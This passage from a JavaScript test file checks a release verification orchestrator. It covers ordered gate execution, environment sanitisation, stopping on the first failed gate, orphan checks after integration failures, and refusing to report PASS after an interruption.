      fixtureGate('base'),
      fixtureGate('integration', 'integration'),
      fixtureGate('production', 'production'),
    ];
    const calls = [];
    const stdout = memoryWriter();
    const stderr = memoryWriter();
    let clock = 0;
    const result = await runReleaseVerification({
      gates,
      runner: async (command, args, environment) => {
        calls.push({ command, args: [...args], environment });
      },
      stdout,
      stderr,
      now: () => {
        clock += 100;
        return clock;
      },
    });
    assert.equal(result.ok, true);
    assert.deepEqual(calls.map((call) => call.args.at(-1)), ['base', 'integration', 'production']);
    assert.ok(calls.every((call) => call.environment[inheritedName] === undefined));
    assert.equal(calls[0].environment.PGHOST, 'hostile.invalid');
    assert.equal(calls[0].environment.ALERT_WEBHOOK_TOKEN, '');
    assert.equal(calls[0].environment.GIT_PAGER, 'cat');
    assert.equal(calls[0].environment.GIT_TERMINAL_PROMPT, '0');
    assert.equal(calls[1].environment.INTEGRATION_POSTGRES_IMAGE, APPROVED_IMAGE);
    assert.equal(calls[2].environment.NODE_ENV, 'production');
    assert.equal(calls[2].environment.NEXT_PUBLIC_SITE_URL, 'https://release.example.invalid');
    assert.equal(calls[2].environment.ALERT_WEBHOOK_TOKEN, '');
    assert.match(stdout.contents(), /PASSED: 3\/3 gates/u);
    assert.equal(stderr.contents(), '');
  } finally {
    if (previous === undefined) delete process.env[inheritedName];
    else process.env[inheritedName] = previous;
  }
});

test('release orchestrator stops at the first failed mandatory gate', async () => {
  const calls = [];
  const stdout = memoryWriter();
  const stderr = memoryWriter();
  const result = await runReleaseVerification({
    gates: [fixtureGate('first'), fixtureGate('second'), fixtureGate('third')],
    runner: async (_command, args) => {
      calls.push(args.at(-1));
      if (args.at(-1) === 'second') throw new Error('synthetic command failure');
    },
    stdout,
    stderr,
  });
  assert.equal(result.ok, false);
  assert.equal(result.failedGate, 'second');
  assert.deepEqual(calls, ['first', 'second']);
  assert.match(stderr.contents(), /Failed gate: Fixture second/u);
  assert.doesNotMatch(stdout.contents(), /Fixture third/u);
});

test('release orchestrator verifies orphan state after an integration failure', async () => {
  const calls = [];
  const result = await runReleaseVerification({
    gates: [fixtureGate('integration', 'integration'), fixtureGate('later')],
    runner: async (command, args) => {
      calls.push([command, ...args].join(' '));
      if (calls.length === 1) throw new Error('synthetic integration failure');
    },
    stdout: memoryWriter(),
    stderr: memoryWriter(),
  });
  assert.equal(result.ok, false);
  assert.deepEqual(calls, [
    'node --version integration',
    'npm --ignore-scripts run check:integration-orphans',
  ]);
});

test('release orchestrator cannot report PASS after an interruption between gates', async () => {
  const calls = [];
  let receivedSignal;
  const result = await runReleaseVerification({
    gates: [fixtureGate('first'), fixtureGate('second')],
    runner: async (_command, args) => {
      calls.push(args.at(-1));
      receivedSignal = 'SIGTERM';
    },
    abortSignal: () => receivedSignal,
    stdout: memoryWriter(),
    stderr: memoryWriter(),
  });
  assert.equal(result.ok, false);
  assert.equal(result.interruptedBy, 'SIGTERM');
  assert.deepEqual(calls, ['first']);
});
